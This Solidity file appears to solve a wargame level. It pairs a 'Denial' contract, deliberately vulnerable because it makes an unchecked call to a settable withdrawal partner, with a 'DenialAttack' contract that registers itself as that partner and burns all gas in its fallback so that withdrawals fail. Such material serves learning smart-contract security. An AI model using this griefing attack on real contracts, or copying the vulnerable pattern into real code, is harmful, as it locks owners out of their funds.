// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }
    function withdraw() public {
        uint amountToSend = (address(this).balance)/100;
        partner.call.value(amountToSend)("");
        owner.transfer(amountToSend);
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner] + amountToSend;
    }
    fallback() external payable {}
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract DenialAttack {
    Denial DenialContract;
    
    constructor(address payable DenialContractAddress) public payable {
        DenialContract = Denial(DenialContractAddress);
    }

    function initiateAttack() public {
        DenialContract.setWithdrawPartner(address(this));
    }
  
    fallback() external payable {
        assert(false);
    }
}